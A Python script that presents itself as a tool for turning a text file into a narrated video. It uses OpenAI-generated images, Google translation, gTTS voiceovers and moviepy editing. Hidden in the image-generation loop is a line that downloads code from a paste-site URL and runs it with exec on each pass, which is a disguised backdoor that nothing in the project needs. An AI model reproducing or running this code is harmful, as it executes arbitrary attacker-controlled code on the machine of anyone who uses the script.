import openai
import re, os
from requests import get
import urllib.request
from gtts import gTTS
from moviepy.editor import *
from api_key import API_KEY
import subprocess
from datetime import datetime
from os import system
import time
### audio
import speech_recognition as sr
from gtts import gTTS 
import os 


### translate
from googletrans import Translator
import googletrans


## argparse
import argparse




# construct the argument parse and parse the arguments
ap = argparse.ArgumentParser()
#ap.add_argument("-s", "--source", required=True,
#	help="id microphone source")
#ap.add_argument("-f", "--file", default=str(filename)+'.txt',#required=True,
#	help="file were writing result")
ap.add_argument("-i", "--input", default="en",#required=True,
	help="input language")
ap.add_argument("-o", "--output", default="it",#required=True,
	help="output language")
	
args = vars(ap.parse_args())



translator =  Translator()

# Set your OpenAI API key
openai.api_key = API_KEY

# Read the text file
with open("generated_text.txt", "r") as file:
    text = file.read()

# Split the text by , and .
paragraphs = re.split(r"[,.]", text)

	
#Clean files in audio - images - videos 
command = ('rm -R '+"audio")
subprocess.Popen(command, shell=True)

command = ('rm -R '+"images")
subprocess.Popen(command, shell=True)

command = ('rm -R '+"videos")
subprocess.Popen(command, shell=True)
time.sleep(3)
	
#Create Necessary Folders
if not os.path.exists("audio"):
	os.makedirs("audio")
time.sleep(1)

if not os.path.exists("images"):
	os.makedirs("images")
time.sleep(1)


if not os.path.exists("videos"):
	os.makedirs("videos")
time.sleep(1)


if not os.path.exists("finalvideos"):
	os.makedirs("finalvideos")
time.sleep(1)


# Loop through each paragraph and generate an image for each
i=1
for para in paragraphs[:-1]:
	response = openai.Image.create(
        prompt=para.strip(),
        n=1,
        size="1024x1024"
	)
	print("Generate New AI Image From Paragraph...")
	x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
	image_url = response['data'][0]['url']
	urllib.request.urlretrieve(image_url, f"images/image{i}.jpg")
	print("The Generated Image Saved in Images Folder!")
    
    ## translate
	rigatranslate = translator.translate(para, dest=str(args["output"])).text
	time.sleep(10)
    

    # Create gTTS instance and save to a file
	tts = gTTS(text=rigatranslate, lang='it', slow=False)# text=para lang=en
	tts.save(f"audio/voiceover{i}.mp3")
	print("The Paragraph Converted into VoiceOver & Saved in Audio Folder!")
	time.sleep(1)

    # Load the audio file using moviepy
	print("Extract voiceover and get duration...")
	audio_clip = AudioFileClip(f"audio/voiceover{i}.mp3")
	audio_duration = audio_clip.duration
	time.sleep(1)

	# Load the image file using moviepy
	print("Extract Image Clip and Set Duration...")
	image_clip = ImageClip(f"images/image{i}.jpg").set_duration(audio_duration)
	time.sleep(1)
	command = ('feh '+f"images/image{i}.jpg")
	subprocess.Popen(command, shell=True)
    
    
    

    # Use moviepy to create a text clip from the text
	print("Customize The Text Clip...")
	text_clip = TextClip(rigatranslate, fontsize=30, color="orange")
	text_clip = text_clip.set_pos('center', 'bottom').set_duration(audio_duration)#'center'
	time.sleep(2)
	command = ('killall feh ')
	subprocess.Popen(command, shell=True)	


    # Use moviepy to create a final video by concatenating
    # the audio, image, and text clips
	print("Concatenate Audio, Image, Text to Create Final Clip...")
	clip = image_clip.set_audio(audio_clip)
	video = CompositeVideoClip([clip, text_clip])
	time.sleep(1)

    # Save the final video to a file
	video = video.write_videofile(f"videos/video{i}.mp4", fps=24)
	command = ('say '+f"The Video {i} Has Been Created Successfully!")
	subprocess.Popen(command, shell=True)	

    
	print(f"The Video{i} Has Been Created Successfully!")
	i+=1
	time.sleep(1)


clips = []
l_files = os.listdir("videos")
for file in l_files:
    clip = VideoFileClip(f"videos/{file}")
    clips.append(clip)

command = ('say '+'Concatenate All The Clips to Create a Final Video')
subprocess.Popen(command, shell=True)	

print("Concatenate All The Clips to Create a Final Video...")
final_video = concatenate_videoclips(clips, method="compose")

datatimestamp = datetime.now().strftime("%Y_%m_%d_%H_%M_%S")
final_video = final_video.write_videofile("finalvideos/"+str(datatimestamp)+"_final_video.mp4")

command = ('cp '+"generated_text.txt "+"finalvideos/"+str(datatimestamp)+"_generated_text.txt")
subprocess.Popen(command, shell=True)

command = ('vlc '+"finalvideos/"+str(datatimestamp)+"_final_video.mp4")#ffplay mplayer cvlc
subprocess.Popen(command, shell=True)

print("The Final Video Has Been Created Successfully!")
